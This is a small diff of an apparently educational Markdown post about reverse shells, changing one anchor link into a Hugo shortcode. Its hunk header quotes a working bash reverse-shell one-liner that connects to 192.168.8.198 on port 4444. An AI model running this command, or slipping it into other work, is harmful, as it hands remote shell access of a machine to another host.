@@ -160,7 +160,7 @@ When you execute `$ bash -i >& /dev/tcp/192.168.8.198/4444 0>&1`
 [Bryan Brake]: https://twitter.com/bryanbrake
 [Julia Evans]: https://jvns.ca/
 [BrakeSec slack]: https://brakesec.slack.com
-[summary]: #summary
+[summary]: {{< ref "#summary" >}}
 [netcat]: http://nc110.sourceforge.net/
 [Bash]: https://en.wikipedia.org/wiki/Bash_(Unix_shell)
 [ZSH]: https://en.wikipedia.org/wiki/Z_shell
